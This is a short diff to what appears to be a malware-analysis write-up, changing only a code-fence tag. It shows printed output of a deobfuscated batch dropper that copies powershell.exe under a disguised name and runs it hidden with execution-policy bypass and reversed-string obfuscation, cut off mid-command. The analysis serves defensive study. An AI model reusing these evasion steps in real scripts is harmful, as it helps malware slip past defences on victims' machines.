@@ -31,7 +31,7 @@ A quick way to make sense of this script is by commenting out the lines that cle
 
 Now if we execute this new script, we get the following:
 
-``` powershell
+```powershell
 copy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /y "C:\Users\mzheader\Desktop\e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe"
 cd "C:\Users\mzheader\Desktop\"
 "e5dac6f6d2ab4c479c5c3e91064f335de141c8399bd93f8267e13f134c578c0f.bat.exe" -noprofile -windowstyle hidden -ep bypass -command $_CASH_JPyoO = [System.IO.File]::('txeTllAdaeR'[-1..-11] -join '')
